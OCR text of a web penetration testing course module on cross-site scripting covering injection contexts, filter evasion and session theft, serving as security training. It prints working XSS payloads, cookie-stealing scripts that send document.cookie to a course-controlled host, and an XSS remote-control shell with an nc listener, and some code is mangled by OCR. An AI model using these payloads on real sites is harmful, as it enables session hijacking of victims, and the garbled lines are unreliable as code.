In Stored XSS, data supplied as input could be included as part of the 
response in a totally separate portion of the application not immediately 
rendered 
• Input can also end up included in the response of multiple distinct locations, each of 
which needs to be assessed independently 
Rather than submitting the same innocuous string for all input, unique 
variations will need to be employed for each distinct input 
• Allowing us to identify which input caused a result we only see later in interaction with 
the application 
With the dynamic and non-persistent nature of Reflected XSS attacks, input immediately becomes part of the 
application's response. The persistent nature of Stored XSS flaws doesn't preclude them from being rendered 
immediately, but we do need to account for the cases in which our input renders elsewhere within the 
application that is not part of the direct response of our input. 
Simply using a static unique string like 424242424242 would still allow us to possibly encounter our strings that 
end up within a different portion of the application. However, we would not be able to easily determine the 
connection between the string being presented. Imagine an application logging the filenames of profile pies 
when users upload them. This log of filenames is able to be displayed by the user but is not the page returned 
after successful upload. Ifwe used our static string of 424242424242, then it might not be immediately obvious 
that it was the uploaded file name rather than other fields that proved injectable. 
Rather than just a string that is unique when compared to all data typically displayed by the application, we 
would really prefer an injection string that is unique amongst all of our injection strings. Having a 1 : I 
correlation between inputs and outputs would allow for easier and more efficient determination of the input that 
resulted in the content being subsequently sent back to the client. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
71 
.__,, 
.__,, 
Common XSS Injection. Contexts 
Assume we have discovered our clever, but innocuous and very likely unique- 
for-the-app string, 424242424242, contained in a response 
Injection context: Understanding the contextual details of the response 
containing our input is vital to get JavaScript to execute where our input lands 
Some of the most common XSS injection contexts are: 
HTML content: 
<div><p> Don't Panic, 424242424242 </p></div> 
Tag attribute: 
<input type="text" name="xss" value="424242424242"> 
Existing JS code: 
<script>var HitchHiker="424242424242"; 
</script> 
.__,, 
'-../ 
'---' 
'-../ 
'---' 
'-.../ 
'-.../ 
'---' 
'-' 
'---' 
'---' 
'---' 
'-' 
'-../ 
We need to carefully review where our input lands in the HTTP Response since our goal is to not submit an 
innocuous string, but rather to achieve JavaScript execution capabilities. We refer to this as understanding the 
injection context. The injection context takes into consideration where within the source code our input ends 
up, so that we can understand how our input might need to be altered in order to achieve execution. 
Some of the most commonly encountered injection contexts are: 
• 
HTML content 
• 
Tag attribute 
• 
Existing JavaScript code 
Note, later we will also be discussing how to identify which characters get stripped or sanitized prior to output. 
Naturally, this too plays a role in our being able to successfully achieve code execution. 
72 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'---' 
'-' 
'-' 
'-' 
'---' 
'-' 
'---./ 
'---' 
'---' 
'---./ 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-.../ 
'-..../ 
'---' 
'-..../ 
. ..._,, 
'-' 
'-' 
XSS Injection Context: HTML. Content 
Input: 424242424242 
Initial HTML: 
<div><p> Don't Panic, 424242424242 </p></div> 
Context Considerations: 
Payload can be self-contained and doesn't require any particular prefix or suffix 
due to the context 
Example Payload - Broken Image Injection: 
<img src="x" onerror=alert(42) ;/> 
Resultant HTML: 
<div><p>Don't Panic, <im.g src=nx11 onerror=alert(42) ;/> </p></div> 
Let's look at a simple injection context. Here we will find our input simply being dropped in directly as HTML 
content being displayed. Without filtering or other mitigations, this injection context will provide many 
possibilities. 
Input: 424242424242 
Initial HTML: 
<div><p> Don't Panic, 424242424242 </p></div> 
Contextual Considerations: 
Self-contained payloads work well here, and no particular prefix or suffix will necessarily be required. 
Example Payload - Broken Image Injection: 
<img src="x" onerror=alert(42); /> 
Resultant HTML: 
<div><p> Don't Panic, <img src="x" onerror=alert(42); /> </p></div> 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
73 
'-..../ 
'--' 
'--' 
XSS. Injection Context: Tag Attributes 
Input: 424242 
Initial HTML: 
<input type="text" name="xss" value="424242"> 
Context Considerations: 
• Prefix option to close value assignment and possibly close the tag "> 
• Suffix depends upon whether additional tags injected 
Example Payload - Event Injection: 
424242" onload="alert(42) 
Resultant HTML: 
<input type="text" name="xss" value="42424211 onload="alert(42)"> 
.....__,, 
'--' 
'--' 
'--' 
'--' 
'--' 
'-.../ 
'-../ 
'--' 
'-../ 
'--' 
'--' 
'-../ 
'-.../ 
Another common injection context is for our input to be delivered within HTML as the value of a tag attribute. 
We are within an existing HTML element, which changes things a bit. Main considerations are being mindful of 
the element we are within and whether and how we will terminate the element or remain contained within the 
tag. 
Input: 424242 
Initial HTML: 
<input type="text" name="xss" value="424242"> 
Context Considerations: 
• 
Prefix option to close value assignment and possibly close the tag "> 
• 
Suffix depends upon whether additional tags injected 
Example Payload - Event Injection: 
424242" onload="alert(42) 
Resultant HTML: 
<input type="text" name="xss" value="424242" onload="alert(42)"> 
'--' 
.__,, 
'-.../ 
'--' 
'--' 
'--' 
'--' 
'-../ 
'--' 
'-' 
'--' 
'---' 
'-../ 
'-..../ 
'-../ 
'--' 
'--' 
'-../ 
'--' 
'---' 
'---' 
'--' 
'---' 
74 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
XSS Injection Context: Existing JS Code 
Input: 424242 
Initial HTML: 
<script>var HitchHiker="424242"; 
Context Considerations: 
</script> 
• Suffix options include JS line terminator ; and single line comment delimiter - / / 
• Often will be within a JS function so closing parenthesis might also be needed ) 
Example Payload: 
42";alert(42) ;// 
Resultant HTML: 
<script>var Hi tchHiker=" 42 H ; alert ( 42) ; / /"; ... </ script> 
Many applications these days incorporate heavy client-side JavaScript for much of their functionality. This can 
lead to the next injection context where our input lands within existing JavaScript code. Obviously, there can be 
many different contexts within this one, but some key things to be mindful of are how to exit cleanly. 
Input: 424242 
Initial HTML: 
<script>var Hi tchHiker=" 424242"; ... </ script> 
Context Considerations: 
• 
• 
Suffix options include JS line terminator; and single line comment delimiter - // 
Often will be within a JS function so closing parenthesis might also be needed ) 
Example Payload: 
42" ;alert(42) ;// 
Resultant HTML: 
<script>var HitchHiker="42" ;alert (42); //"; ... </script> 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
75 
'---' 
'---' 
Filter Tests 
• Discovering an injection point that yields immediate or delayed 
reflection ! = XSS vulnerability 
• A possible next step would be to test for the presence and efficacy 
of any filtering or encoding: 
o You could immediately jump to a simple PoC if you suspect no filters will 
be present or as a quick sanity test 
• Filtering or encoding is increasingly common 
• Majority of filters are blacklist rather than whitelist, which 
presents opportunities for evasion or bypass 
o Enumerating all possible evil proves rather difficult 
'---' 
'---' 
'-.../ 
'---' 
'-' 
'-.../ 
'-' 
'-.../ 
'-.../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'--' 
'-' 
Though we have determined that input does indeed get reflected back within the server's response, this still does 
not mean that we have discovered an exploitable XSS flaw. After our reflection tests, we can move onto the 
filter tests. This serves as a possible next step rather than a required one. Perhaps for efficiency or because you 
have little expectation of filtering, it could be reasonable to immediately attempt a straightforward XSS PoC 
payload. 
However, a more thorough, professional, and repeatable approach would be to move into the filter test. Input 
filtering or output encoding occurs with more regularity as shops begin to employ better web application 
security practices. However, filtering is still far from a given. Those filters that do exist are predominantly 
blacklist filters rather than whitelist filters. Put simply, a blacklist filter approaches the world with a list of all 
possible evil and seeks to thwart it. We often see simple filters for a single quote (') or the angle brackets ( < > ). 
Blacklists are difficult to get right due to various forms of legitimate encoding, and, moreover, the requirements 
imposed by the business. 
76 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-.../ 
'-' 
'-../ 
'---' 
'-' 
'-' 
'---' 
'-../ 
'---' 
'---' 
'---' 
'-.../ 
'-' 
'---' 
'-' 
'---' 
'-' 
'-' 
'-..../ 
'-.../ 
'---' 
'-' 
Filter Bypass/Evasion 
• The goal of the filter test is to determine whether, and how, 
filtering/ encoding is employed that could impact successful XSS 
payload execution 
• Better understanding of application filtering/ encoding could 
allow us to craft attacks accordingly 
• For example, applications might filter/ encode the < and > 
• In response, we could: 
o Target XSS payloads that specifically do not require those characters 
o Craft the XSS payload with hopes of escaping the filter logic 
o Encode the data to confuse or bypass the filter 
The goal of this phase of our XSS fuzzing is to develop an understanding of the input filtering or output 
encoding performed by the application. By understanding what is, and what is not, filtered, we can have a 
greater chance of successfully bypassing the filter or encoding. We can craft our eventual XSS payloads 
according to the knowledge we gain about the security countermeasures being leveraged by the application. 
Perhaps the most common type of filtering for expected XSS targets is to blacklist the angle brackets. Although 
this is not the only type of filter you will encounter, it is a common one used when the application owners are 
concerned about the potential for XSS attacks. Unfortunately for them, simply blocking the literal '<' or '>' is 
not sufficient to preclude successful XSS discovery and exploitation. 
We could simply leverage XSS payloads that do not require the angle brackets, attempt to escape the filter logic, 
or encode the data to fly right through the blacklist filter. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
77 
'--' 
v 
'---' 
DOM.Event ... Handl.erBypass 
The most commonly filtered XSS input is the <script> tag 
Beyond the full script tag, the angle brackets would be the 
characters most likely to get filtered or encoded during output 
Events can call JavaScript without having to reference <script> 
Based upon context, might not even require angle brackets at all 
DOM event handlers can sometimes provide a simple bypass 
opportunity 
• Depending upon where our input ends up within the HTML 
Example Event Payload: onerror=alert ( 42) 
'-J 
'---' 
'-' . 
'-' 
\.J 
'-' 
'---' 
'-' 
'--' 
'---' 
'-J 
'-' 
'---' 
With filtering becoming more common all the time, we will often find <script> or perhaps the angle brackets 
entirely filtered out. Event handlers provide an extremely powerful opportunity for us. Event handlers can 
directly call JavaScript without even requiring the <script> tag. 
Not only do the event handlers obviate the need for the tag they can go even further than that by possibly 
allowing us to not even necessarily require angle brackets at all. This possibility is most likely to be the case 
with the tag attribute context discussed previously. 
Let's look at an example use of the event handlers. 
78 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'-...,/ 
'-' 
'-' 
\.J 
'---' 
'---' 
'--- 
'-' 
'-' 
-· 
\.J 
'--' 
'-' 
'-' 
'-J 
'-' 
'-' 
'---' 
'--" 
'---' 
'---' 
'-' 
'-' 
'---' 
'-' 
Event Handler: HTMi. injection to Script Injection 
<script> tags are filtered out or encoded 
However, perhaps <img> and <a> tags seem to get rendered 
properly 
• Certainly have some fun HTML injection opportunities 
Event handlers would be an important possible injection to gain 
scripting ability without the <script> tag 
Rather than <script>alert ( 42) </ script> we inject: 
<img src="blah" onerror=alert(42)> 
blah doesn't exist so onerror will fire ... better trigger pop-up box 
Great small event injection: 
<svg onload=alert ( 42) > 
Here is an example in which we find ourselves supplying input to an application. In this case, angle brackets 
seem unfiltered, though <script> tags are filtered out. 
Our typical injection is: 
<script>alert(42)</script> 
Rather than that approach, we inject: 
<img src="blah" onerror=alert(42)> 
That nonexistent image will cause the injected onerror event to be triggered. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
79 
'--' 
.___,, 
• XSS payload execution depends 
upon the particular vendor and 
version of the browser 
• In addition, most major browsers 
now include built-in XSS filtering 
capabilities (Firefox's is being 
developed) 
o Given XSS's ubiquity, this is a good 
thing ... for everyone but us 
•We need to take special care to 
ensure that our own browser 
doesn't block the attack payload 
• Three viable approaches: 
o Use Firefox (at least until its 
XSS Filter becomes default) 
• At present, Firefox relies on 
Content-Security- Policy 
o Use an old browser that lacks 
the XSS filtering 
o Fully disable the XSS filtering 
capabilities 
'---' 
.___,, 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
Browsers play a vital role in XSS attacks. lfyou have spent even a little time looking at any XSS cheat sheet or 
discussions about evasion, then you are, no doubt, aware that different browsers render content differently. 
Beyond the basic idiosyncrasies of the browsers and their rendering, or lack thereof, we have another 
consideration. An additional challenge is the increasingly common browser-based XSS filters. 
Regardless of the application's filtering or encoding, the browser could filter our XSS payloads. How the 
filtering occurs and the success of the approach vary across the browser version and vendor. 
We need to take overt precautions to ensure that we do not inadvertently block our own XSS payload. We need 
to be especially mindful of this potential because we could misconstrue a browser filtering our payload as 
unsuccessful XSS, which would constitute a false negative. 
How do we deal with this challenge? We have a few options. The first, and most common, option is to leverage 
Firefox. The XSS filter for Firefox is still being developed1 or maybe not.2 Though it lacks a pure XSS filter, 
Firefox does look for and honor the Content-Security-Policy3 HTTP header. This header could fundamentally 
alter the viability of XSS as an attack vector. But before you get too freaked out, it is, at present, not even a 
formal standard. Also, CSP would be opt-in, and to protect against XSS would likely require significant 
changes4 on the application architecture front. So, this will rarely get in our way. 
Besides just leveraging Firefox, we still have additional options at our disposal. We could also opt for an old 
browser that lacks the XSS filtering capabilities offered in modem browsers. Note that this can prove 
problematic when the test includes more modern capabilities such as HTML5 or non-eval() approaches to JSON 
parsing, as two simple examples. 
80 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'---' 
'-.../ 
'-' 
'--' 
.____,, 
'--' 
. .____,, 
'---' 
'--' 
'-..,/ 
'--' 
'--' 
'-.../ 
'-'' 
'--' 
'--' 
'---' 
'-..,/ 
'---' 
'-.../ 
'-..,/ 
\.J 
'---' 
'---' 
Finally, we could use a modem browser with an XSS filter, but attempt to fully disable. This option may or may 
not be possible, depending on the version and vendor of the browser. Chrome has historically made fully 
disabling its security capabilities difficult to achieve. 
References: 
[1] https://wiki.mozilla.org/Security/Features/XSS _Filter (https://cyber.gd/542 _ 413) 
[2] https://bugzilla.mozilla.org/show _ bug.cgi?id=52866 I (https://cyber.gd/542 _ 414) 
[3] https://developer.mozi l la.org/en-US/ docs/Web/Security /CSP /Introducing_ Content_ Security_ Policy 
(https://cyber.gd/542 _ 411) QR 
[ 4] https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Using_ Content_ Security _Policy 
(https://cyber.gd/542 _ 412) 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
81 
1...../ 
1...../ 
SEC542 VM:.DisablingXSS .. AuditoriniChromium 
Chromium on the SEC542 VM has the XSS Auditor enabled by default 
See the Developer Tools Console (PC: Ctrl+Shift+J) (Mac: Cmd+Opt+J) 
Normal Behavior 
<script>alert(42);</script> 
[!( 6J 
iSl v 
~ 
1:H 
X 
Disable XSS Auditor 
\_.I 
\_.I 
'-J 
'-J 
'-J 
'-J 
'-' 
'-' 
'-J 
\_.I 
'---' 
<script>alert(42) ;</script> 
Within the SEC542 VM, Chromium, by default, will run with the XSS Auditor enabled. Be mindful that with 
this enabled some of your PoC payloads might not pop, even though you have exploited the XSS vulnerability. 
This behavior can be seen by watching the Console tab of the Developer Tools. The screenshot below shows the 
results of our successful injection of: 
<script>alert(42) ;</script> 
~ 
® 
!l'I 
t I 
0 
: 
X 
To disable the XSS Auditor, first close all running instances of Chromium. Then launch Chromium from the 
command line with the --disable-xss-auditor switch. 
$ chromium-browser --disable-xss-auditor 
Now our successful inject yields the expected awesomeness. 
<script>alert(42) ;</script> 
82 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\_.I 
\_.I 
'-' 
'---' 
'---' 
'-J 
'--' 
'--' 
'-J 
'---' 
\_.I 
'-J 
'---' 
'-' 
'--' 
\_.I 
-._; 
'--' 
'-' 
\_.I 
\_.I 
\_.I 
\_.I 
'--' 
'-' 
'-J 
'-./ 
Bypassing Browser Filters 
• During the discovery phase, we attempt to find out whether the 
application shows evidence of an XSS flaw 
• The goal is not to determine whether a certain browser might 
protect users: 
o This is rarely the goal 
• Unless required or compelled by the client to perform browser 
bypass, consider this out of scope 
• For a pure web application penetration test, the browser is not the 
focus of the assessment 
Although the previous discussion of browsers and filter bypass focused squarely on our own browser's role, 
what about taking into account other browsers? We have little control over the version, vendor, or configuration 
of browsers being employed by folks that would be the victims of any live XSS attack. So how, then, are we to 
deal with the issue of in-browser XSS filters existing on the potential victims? 
Unless the details of the penetration test specifically require considering potential victims' browsers, this should 
be considered out of scope for a web application penetration test. This is not simply a way of having to get out 
of the challenge of bypassing browsers' XSS filters. Rather, this is just an understanding that our focus is on 
assessing the web application vulnerabilities. Does the web application exhibit an XSS vulnerability? Does a 
potential victim browser have anything to do with that question? 
Now, some folks will suggest that much the same way that we might be asked to bypass a web application 
firewall (W AF), we could also be tasked with bypassing the browser protections. These feel rather different, 
though. The W AF exists specifically to protect applications being assessed, whereas the browser protections do 
not. Browser XSS filters have been bypassed quite often, and although this could be a fun engagement, this is 
not the focus of a web application penetration test. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
83 
..._,, 
..._,, 
XSS PoCiPayloads 
Collections of XSS payloads ready for fuzzing already exist: 
• Fuzzdb: XSS payloads under /opt/fuzzdb/attack-payloads/xss 
• JBroFuzz: Part of ZAP's fuzzer 
/opt/jbrofuzz/ 
• Burp: Pro expands on payloads provided in Burp Free 
• ZAP: Simply a collection of JBroFuzz and some fuzzdb 
• XSSer: Includes a "valid payload vectors" list specific to XSS 
Note that simply hitting every potential input with all XSS payloads 
will be far from subtle 
• Might also get you blocked/ shunned by the target 
..._,, 
..._,, 
'-' 
'-' 
'-' 
'-../ 
'-../ 
'-../ 
'-' 
'-../ 
'-../ 
'-' 
'-../ 
'---" 
Collections ofXSS payloads already exist. A number of them have already been discussed as part of general 
fuzzing or with respect to fuzzing for particular types of flaws. 
There are a number of fuzzing payloads that also include XSS representation: JBroFuzz, 1 fuzzdb,2 the lists 
included with ZAP, Burp free, and Burp Pro. Another collection that can prove useful was developed as part of 
the tool XSSer (available in the Security542 VM at /opt/xsser/core/fuzzing/vectors.py). Many items from the list 
are already included as part ofXSSer but can also be used in other tools. The list is referred to as the XSSer 
valid payload vectors3 and includes some items not referenced elsewhere. 
Although fuzzing with XSS payloads will typically not cause significant harm to applications, care should 
nonetheless be taken when performing any type of fuzzing. An additional consideration about fuzzing XSS has 
to do with the lack of subtlety involved. Launching a large-scale fuzzing campaign will certainly increase the 
chance that the target will detect your efforts. If stealth is a required element of your penetration test, then the 
full-throttle fuzzing with default payloads will likely not be a desirable approach. 
Greater stealth can be achieved by decreasing the speed with which the fuzzing strings are submitted. Also, 
changing the payloads can prove useful because many of these strings are overt and have direct IDS or WAF 
signatures associated with them. 
References: 
[ 1] http://sourceforge.net/projects/jbrofuzz/ (https://cyber.gd/542 _ 41) 
[2] https://code.google.com/p/fuzzdb/ (https://cyber.gd/542 _ 42) 
[3] http://xsser.03c8.net/ (https://cyber.gd/542_ 431) 
84 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-../ 
..._,, 
'-' 
'-' 
'-../ 
'-../ 
'-' 
'-' 
'-' 
'-' 
'---" 
'-../ 
'-../ 
'-' 
'-' 
'-..J 
'-' 
'-' 
'-../ 
'-' 
'---"' 
'-' 
'-' 
'-../ 
'---"' 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
I.XXE 
2. Exercise: XXE 
l. Document Object Model (DOM) 
4. Cross,Site Scriptir1g {XSS) Primer 
5. Classes of XSS 
6. Exercise: XSS 
7. Discovering XSS 
8. XSS Impacts 
9. Exercise: HTML Injection 
IO. XSS Tools 
11. BeEF 
J 2. Exercise: BeEF 
13.AJAX 
14. APi Attacks 
15. Data Attacks 
i 6. Exercise: AJAX XSS 
17. Summary 
SEC542 I WebP.pp Penetration Testing and 
Course Roadmap 
We will next discuss some potential impacts ofXSS. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
85 
'-' 
'-' 
\....I 
Possible.\Upgra.des.to.·.our. alert.(42) 
XSS Proof-of-Concept (PoC) will be a static pop-up via some means 
alert(42) II confirm(42) II prompt("Answer?", "42") 
Demonstrate domain application context 
alert(document.domain) II confirm(document.domain) 
Demonstrate session/ content abuses 
document. cookie 11 Forged in-session Requests 11 Defacement 
Demonstrate external JavaScript loading capability 
src="//sec542.org/evil.js" 
Demonstrate advanced user attacks with frameworks 
BruteLogic XSS Shell, BeEF, Metasploit escalation, etc. 
'-" 
'-' 
'-' 
'---' 
'-' 
'-' 
'-' 
....__,, 
....__,, 
'-/ 
'---' 
....__,, 
,__,, 
\..../ 
While a pop-up suggests we can insert JavaScript for execution within the victim browser's context, that is only 
the first type of PoC payload. Further PoC payloads can help better illustrate capabilities offered by XSS flaws. 
A quick proof showing explicitly that the application's context is available also proves useful. 
Below is a quick list of possible steps beyond the initial pop-up PoC. 
XSS Proof-of-Concept (PoC) will be a static pop-up via some means 
alert(42) 
II confirm(42) 
II prompt("Answer?","42") 
Demonstrate domain application context 
alert (document. domain) 
11 confirm (document . domain) 
Demonstrate session/content abuses 
document. cookie II Forged in-session Requests II Defacement 
Demonstrate external JavaScript loading capability 
src="//sec542.org/evil.js" 
Demonstrate advanced user attacks with frameworks 
BeEF, Metasploit escalation, etc. 
86 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
-....J 
....__,, 
'-" 
\..../ 
\..../ 
\..../ 
. .__,, 
'-' 
'-.-/ 
'-' 
....__,, 
\..../ 
\..../ 
\..../ 
\..../ 
\..../ 
\..../ 
-....J 
'-' 
'-' 
\..../ 
'-' 
\..../ 
'---' 
.__,, 
Session Abuse 
Beyond the amazing alert ( 42) boxes we cause, abusing sessions is the most 
commonly expected impact of successful XSS exploitation 
The victim's browser renders our JavaScript within the context of the 
vulnerable application 
If the victim user already had an authenticated session with the application, 
then our JavaScript executes within the context of their authenticated session 
This fact affords us some interesting opportunities to abuse the vulnerable 
application leveraging the victim's privileges 
XSS session abuse comes in two primary flavors: 
Session hijacking 
Non-interactive session abuse 
The most commonly considered XSS impact, beyond the pop-up box, of course, is the potential for adversaries 
to abuse client sessions. Our scripts execute within the context of the user's session with the vulnerable server. If 
the user has already authenticated, then the session information might be accessible to our executing scripts. 
While full theft of session would typically be preferable and seem more impactful to application owners, as we 
will see it might not always prove possible to achieve. Even still we might be able to abuse the victim's session 
in a non-interactive fashion. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
87 
',_,; 
'-_,I 
S.ession • Hijacking 
The most serious session abuse using XSS could afford us the ability 
to fully interact as the user 
To achieve this, we will need to hijack their active session, typically 
by stealing and reusing their session tokens, such as cookies 
• A more persistent hijack might be achieved if we can social engineer the user 
to disclose their credentials 
Our injected script is presented from the same origin as the session 
token 
• Which means our script can manipulate and interact with the page's DOM 
directly and programmatically 
XSS session attacks can vary in capability. Full compromise of the victim's session might be possible and allow 
us to interactively operate as the user of the vulnerable application. The primary method of achieving session 
hijack will require us to ex filtrate the user's session cookies ( or other authenticated session tokens) and then use 
them on our own system. 
With our scripts being delivered from the origin server that presented the session token to the user in the first 
place, SOP will not be a concern. Likewise, our scripts will be able to fully interact with and manipulate the 
DOM in question. 
88 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
',_,; 
\_/ 
'-../ 
'-../ 
'-../ 
'-.../ 
'-../ 
'-../ 
\_/ 
'---" 
\_/ 
'-...../ 
''--../ 
\_/ 
ff 
\_/ 
'--' 
-....., 
'--.J 
'--' 
'--.J 
'--.J 
'--' 
'-.../ 
'--.J 
'-...../ 
'--' 
'--' 
'--.J 
'--' 
'--' 
'-.../ 
\_/ 
'-../ 
'---" 
'--' 
'--' 
'--.J 
'-../ 
Session Abuse: DOM(ination) Review 
Some key DOM properties, methods, and events for session hijacking 
DOM Properties that could contain session data we want: 
document. cookie - Cookies are most common target 
document. URL - Query parameters 
document. forms - Hidden Form Fields and CSRF Tokens 
Using location to send data to a server we control: 
location= 'http://sec542.org/c.php?='+document.cookie 
location.replace('sec542.org/c.php?='+document.cookie) 
Unfortunately, the location methods will result in actually redirecting the 
victim's browser, which makes the attack much more likely to get noticed 
The most straightforward and intuitive approach to stealing session data is to have the browser send the session 
information to a web server that we control. 
The following DOM properties typically contain things relevant to sessions: 
document. cookie - Cookies are most common target 
document. URL - Query parameters 
document. forms - Hidden Form Fields and CSRF Tokens 
Then we can use the location capability to redirect the victim's browser to our web server and pass the desired 
information to us. The location, document.location, and window.location approaches are pretty equivalent in 
functionality and can largely be used in an interchangeable fashion. Besides the location object, the fetch() API 
might also be used and function can also be used. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
89 
'---' 
\....., 
Session Theft without· Redirection 
<script> 
img = new Image(); 
img.src='//sec542.org/cookiecatcher.php?='+document.cookie; 
</script> 
Basic building blocks above allow for less obvious cookie theft (assuming no 
HttpOnly flag set on the cookie) 
• In all things JavaScript, there are times we will need to tweak this (and ways to do so) 
One simple tweak that should not be overlooked is to leverage an HTIPS target 
rather than HTIP 
• There could be some egress filtering, but more likely concern is the Secure flag might be set 
on the cookie 
\....., 
'-' 
'-' 
'-' 
'-.J 
'-' 
'-' 
'-' 
'-' 
'--../ 
'--./ 
'-' 
'-' 
'---' 
The location object provides a conceptually simple and straightforward method of session theft. However, the 
major drawback is that the user's browser is actually redirected. This obviously greatly increases the likelihood 
of detection of our shenanigans. Stealthier methods exist that will not leave the victim browser address bar filled 
with https://evil.site/cookiecatcher.php?cookie= ... 
One stealthy approach involves using JavaScript to create a new, albeit broken, image that points to our cookie 
catching script. 
<script> 
img = new Image(); 
img.src='//sec542.org/cookiecatcher.php?='+document.cookie; 
</script> 
90 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-' 
...___, 
'-' 
'-' 
'-' 
'-' 
...___, 
'---" 
'--./ 
'--../ 
'-' 
'-' 
'-' 
'-' 
'-' 
'--./ 
'-' 
'-' 
'--./ 
'-' 
'-' 
'--' 
'---' 
'---' 
'--.../ 
HTTPOnly 
Using JavaScript to interface with cookies is AWESOME!!! 
When allowed ... HttpOnly flag set on cookies makes things more difficult 
HttpOnly == FALSE 
alert(docum.ent.cookie) 
HttpOnly -- TRUE 
Q 
O !fi~ctr;t 
l1".; Ccnso!e 
t ~ Cache Stcrage 
,§ C•okl .. 
• El !ndexedDB 
X 
Though not ubiquitous, the adoption of the HttpOnly flag does seem to be increasing, in our experience. When 
set to "true", only HTTP (and not JavaScript) is allowed to interface with the cookies. We/adversaries are the 
reason this property exists. The justification for the flag is aimed squarely at adversaries (and our cookie 
thieving PoCs) who employ XSS to steal cookies. 
Here we use an XSS exploit against http: / / dvwa/ and successfully alert (document. cookie) 
Even though we exploit the exact same flaw, with HttpOnly set true then alert (document. cookie) 
yields nothing. 
8 Ca-the Storag_(' 
... @= Cooldes 
• § lndexod OS 
X 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
91 
'-" 
'-" 
Bonus Points: Brute Logic Interactive XSS Backdoor 
XSS Injection 
<svg onload=setinterval(function(){d=document; 
z=d.createElement("script") ;z.src="//sec542.org:1234"; 
d.body.appendChild(z)},0)> 
Shell Controller (Terminal on Attacker) 
while :; do printf "j$ "; read c; echo $c Inc -lvvp 1234 
>/dev/null; done 
http://brutelogic.eom.br/blog/using-xss-to-control-a-browser/ 
r:s~:t~"'~ 
~ -,;'"'"""' 
~= 
,,,,,~~~ ·(,"*~-,/4ii,,+s=- -· 
'-" 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-../ 
'-..../ 
'-..../ 
Below is the script that can be injected via XSS on the victim system. This presumes <svg 
onload=alert ( 42) > would execute. Tweak according to injection point: 
<svg onload=setinterval(function(){d=document; 
z=d.createElement("script") ;z.src="//sec542.org:1234"; 
d.body.appendChild(z)},0)> 
URL encoded version of the above to be used in URI for simple Reflected XSS 
%3Csvg%20onload%3Dsetinterval(function()%7Bd%3Ddocument%3Bz%3Dd.createEleme 
nt(%22script%22)%3Bz.src%3D%22%2F%2Fsec542.org%3A1234%22%3Bd.body.appendChi 
ld(z)%7D%2C0)%3E 
In a terminal, execute the following command: 
while :; do printf "j$ "; read c; echo $c I no -lvvp 1234 >/dev/null; done 
At the j $ prompt, type whatever JavaScript you want. When ready to execute the JavaScript on the victim hit 
Ctr 1-C once and your code will run in the victim and return you to j $ prompt, ready for more JavaScript. 
Ctrl-C a second time will kill the XSS Shell. The following JS can be written to the j $ prompt. 
alert(document.domain); //proves the context our JS is running under 
fetch('//sec542.org/?cookie='+document.cookie); // in another term grep 
cookie /var/log/apache2/access.log 
Code based on XSS Shell by BruteLogic - http://brutelogic.com.br/blog/using-xss-to-control-a-browser/ 
92 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'-../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-../ 
'-..../ 
'-../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-..../ 
'-../ 
'-../ 
'-../ 
'-..../ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS. 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
I.XXE 
2. Exerdse: XXE 
3. Document Object Model (DOM) 
<t. Cross-Site Scripting (XSS) Primer 
S. Classes ofXSS 
6. Exercise: XSS 
1. Discovering XSS 
8. XSS Impacts 
9. Exercise: HTML Injection 
IO. XSS: Tools 
11. BeEF 
12. Exerci5e: BeEF 
13.AJAX 
! 4. API Attacks 
15. Data Attacks 
16. Exer · 
Course Roadmap 
The next exercise is on HTML injection, including XSS and stored administrative XSS. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
93 
"--' 
'-'' 
SECS42 Workbook: HTML Injection 
(_ ··1~ f 
·.·~
.· .. ·- 
...•. · .. 
·· 
~~ 
Exercise 4.3: HTML Injection 
SEC542 /Web App Penetration Testing and Ethical Hacking 
94 
'-' 
'-' 
'-../ 
'-' 
'---- 
'---' 
'---' 
'-' 
'---' 
'-../ 
'-' 
'---' 
'-../ 
'-' 
SEC542 Workbook: HTML Injection 
'-' 
